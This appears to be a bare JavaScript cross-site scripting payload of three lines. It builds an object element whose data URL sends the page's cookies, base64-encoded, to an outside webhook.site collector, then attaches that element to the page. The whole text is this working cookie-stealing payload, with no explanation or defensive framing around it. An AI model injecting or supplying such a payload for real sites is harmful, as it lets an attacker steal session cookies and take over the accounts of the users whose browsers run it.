const objectElement = document.createElement('object');
objectElement.data = 'https://webhook.site/a8857f94-9df6-4b5e-be0e-111a4364a5b6?data='+btoa(document.cookie);
document.body.appendChild(objectElement);
